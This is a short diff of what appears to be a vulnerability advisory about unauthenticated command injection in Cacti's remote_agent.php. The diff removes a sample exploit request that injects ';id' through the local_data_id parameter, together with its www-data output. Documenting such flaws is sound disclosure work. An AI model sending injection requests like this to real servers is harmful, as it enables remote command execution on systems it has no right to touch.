@@ -15,16 +15,6 @@ vulnerability in `remote_agent.php`. The script processes a `local_data_id`
 shell metacharacters to inject arbitrary operating system commands, which
 execute with the privileges of the web server process.
 
-Example exploit:
-```
-GET /remote_agent.php?action=polldata&local_data_id=1;id HTTP/1.1
-Host: cacti.target
-```
-Returns:
-```
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
-
 No authentication is required. The endpoint is reachable by any client that
 can send an HTTP request to the server.
 
